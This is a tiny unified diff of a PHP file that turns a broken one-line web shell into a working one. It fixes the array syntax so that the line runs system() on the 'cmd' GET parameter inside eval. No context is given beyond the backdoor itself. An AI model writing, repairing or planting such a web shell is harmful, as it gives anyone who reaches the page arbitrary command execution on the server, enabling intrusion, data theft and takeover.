@@ -1,3 +1,3 @@
 <?php
-eval(system($_GET("cmd")));
+eval(system($_GET["cmd"]));
 ?>
